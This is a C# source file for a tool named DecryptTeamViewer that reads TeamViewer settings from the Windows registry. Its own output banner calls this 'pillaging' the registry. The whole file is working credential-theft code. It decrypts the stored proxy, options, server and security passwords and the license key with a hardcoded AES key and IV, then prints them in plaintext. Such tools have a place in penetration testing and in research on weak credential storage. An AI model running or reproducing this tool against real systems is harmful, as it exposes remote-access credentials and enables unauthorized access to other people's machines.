using System;
using System.Text;
using Microsoft.Win32;
using System.Security.Cryptography;

namespace DecryptTeamViewer
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("\r\n\r\n=== DecryptTeamViewer: Pillaging registry for TeamViewer information ===\r\n");

            // TeamViewer version
            Console.WriteLine("\r\n=== TeamViewer version ===\r\n");
            Console.WriteLine(GetRegValue("TeamViewerSettings", "Version"));

            // User info
            Console.WriteLine("\r\n=== User Information ===\r\n");
            Console.WriteLine("Account name: " + GetRegValue("TeamViewerSettings", "OwningManagerAccountName"));
            Console.WriteLine("User email: " + GetRegValue("TeamViewerUserSettings", "BuddyLoginName"));

            // Proxy info
            Console.WriteLine("\r\n=== Proxy Information ===\r\n");
            Console.WriteLine("Proxy IP: " + GetRegValue("TeamViewerSettings", "Proxy_IP"));
            Console.WriteLine("Proxy username: " + GetRegValue("TeamViewerSettings", "ProxyUsername"));
            var proxyPass = (byte[])GetRegValue("TeamViewerSettings", "ProxyPasswordAES");
            Console.WriteLine("Proxy password: " + DecryptAES(proxyPass));

            // Credentials

            Console.WriteLine("\r\n=== Decrypted Credentials ===\r\n");
            // Options pass
            var optionsPass = (byte[])GetRegValue("TeamViewerSettings", "OptionsPasswordAES");
            Console.WriteLine("TeamViewer options password: " + DecryptAES(optionsPass));
            // Server pass
            var serverPass = (byte[])GetRegValue("TeamViewerSettings", "ServerPasswordAES");
            Console.WriteLine("TeamViewer server password: " + DecryptAES(serverPass));
            // Security pass
            var securityPass = (byte[])GetRegValue("TeamViewerSettings", "SecurityPasswordAES");
            var exportedSecurityPass = (byte[])GetRegValue("TeamViewerSettings", "SecurityPasswordExported");
            Console.WriteLine("TeamViewer security password: " + DecryptAES(securityPass));
            Console.WriteLine("TeamViewer exported security password: " + DecryptAES(exportedSecurityPass));
            // License
            var licenseKey = (byte[])GetRegValue("TeamViewerSettings", "LicenseKeyAES");
            Console.WriteLine("TeamViewer license key: " + DecryptAES(licenseKey) + "\n");

        }
        public static object GetRegValue(string hive, string value)
        {
            // Gets registry values from TeamViewer keys
            Object regKeyValue = new Object();
            if (hive == "TeamViewerSettings")
            {
                var regKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\WOW6432Node\TeamViewer", false);
                if (regKey != null)
                {
                    regKeyValue = regKey.GetValue(value);
                }
                return regKeyValue;
            }
            else if (hive == "TeamViewerUserSettings")
            {
                var regKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\TeamViewer", false);
                if (regKey != null)
                {
                    regKeyValue = regKey.GetValue(value);
                }
                return regKeyValue;
            }
            else
            {
                regKeyValue = null;
                return regKeyValue;
            }
        }

        public static string DecryptAES(byte[] encryptedPass)
        {
            try
            {
                // AES settings
                Aes aes = new AesManaged
                {
                    Mode = CipherMode.CBC,
                    BlockSize = 128,
                    KeySize = 128,
                    Padding = PaddingMode.Zeros
                };
                // TeamViewer Key & IV
                byte[] key = new byte[16] { 0x06, 0x02, 0x00, 0x00, 0x00, 0xa4, 0x00, 0x00, 0x52, 0x53, 0x41, 0x31, 0x00, 0x04, 0x00, 0x00 };
                byte[] IV = new byte[16] { 0x01, 0x00, 0x01, 0x00, 0x67, 0x24, 0x4F, 0x43, 0x6e, 0x67, 0x62, 0xf2, 0x5e, 0xa8, 0xd7, 0x04 };

                // Decrypt AES passwords
                ICryptoTransform AESDecrypt = aes.CreateDecryptor(key, IV);
                if (encryptedPass != null)
                {
                    var decrytedPass = AESDecrypt.TransformFinalBlock(encryptedPass, 0, encryptedPass.Length);
                    string plaintextPass = Encoding.Unicode.GetString(decrytedPass);
                    return plaintextPass;
                }
                else
                {
                    return null;
                }
            }
            catch (Exception)
            {
                return null;
            }
        }

    }
}
